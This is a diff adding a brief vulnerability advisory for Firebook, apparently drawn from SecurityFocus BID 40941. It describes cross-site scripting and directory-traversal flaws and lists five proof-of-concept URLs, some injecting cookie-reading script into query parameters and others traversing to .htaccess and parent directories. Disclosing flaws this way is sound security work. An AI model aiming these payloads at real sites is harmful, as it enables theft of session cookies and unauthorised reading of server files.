@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/40941/info
+
+Firebook is prone to multiple cross-site scripting vulnerabilities and directory-traversal vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting these issues will allow an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, and to view arbitrary local files and directories within the context of the webserver. This may let the attacker steal cookie-based authentication credentials and other harvested information may aid in launching further attacks. 
+
+http://www.example.com/path_to_firebook_admin/?URLproxy=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/guestbook/index.html?answer=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/guestbook/index.html?answer=guestbook/guest/file.html;page=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/path_to_firebook_admin/?param=1;show=../.htaccess;
+http://www.example.com/guestbook/index.html?answer=guestbook/guest/%2E%2E/index.html
